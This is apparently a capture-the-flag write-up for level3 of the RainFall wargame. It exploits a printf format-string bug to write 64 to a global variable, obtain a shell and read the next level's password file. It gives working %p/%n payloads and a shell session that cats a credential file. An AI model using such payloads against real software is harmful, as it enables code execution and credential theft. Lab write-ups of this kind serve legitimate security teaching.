It's a simple one (when you get it). We have a binary file. When you run the program, you can write anything and it's printed back to you.
We have two functions :  `main` and `v`. The `main` function just calls `v`. 
The `v` function is more interesting, there's a syscall to `/bin/sh`. We also see a call to printf.
And that printf is not protected: like `printf(buffer)`, instead of `printf("%s", buffer)`. So it's an issue we can exploit. 

When we disassemble the code in GDB, we can see that the content of `0x804988c` is mov in `$eax` register. Then, the content of `eax` is compared with 64.
If it's equal to 64, we get the syscall.
In order to put 64 at `0x804988c`, we can exploit printf : indeed, printf is going so search on the stack for parameters. We can use the flag `n` to write everything you want at the wanted address.

The first step is to know where is the string on the stack : `AAAA%p%p%p%p%p%p%p%p%p%p`.  
We got a thing like this : 
```
AAAA0x2000xb7fd1ac00xb7ff37d00x414141410x702570250x70257025
                             ^^^^^^^^^^
```
Like that, we know that the fourth parameter is the start of the buffer. 

```bash
level3@RainFall:~$ python -c 'print "\x08\x04\x98\x8c"[::-1] + "%4$p"' | ./level3 
�0x804988c
```

By using %n, we can write the number of written bytes so far by printf.

```bash
python -c 'print "\x08\x04\x98\x8c"[::-1] + "%4$n"' | ./level3 # will write 0x4 to 0x804988c, because 4 bytes were written before the %n
```

So, all we need to do is make sure 64 bytes (including the 4 address bytes) were written before the %n!

```bash
level3@RainFall:~$ python -c 'print "\x08\x04\x98\x8c"[::-1] + "%60p%4$n"' | ./level3 
�                                                       0x200
Wait what?!
```

Now we just write this payload to a file and use cat to insert our commands just after.

```bash
python -c 'print "\x08\x04\x98\x8c"[::-1] + "%60p%4$n"' > /tmp/3
cat /tmp/3 - | ./level3
�                                                       0x200
Wait what?!
whoami
level4
cat /home/user/level4/.pass
``` 
And we now we get the flag ! 
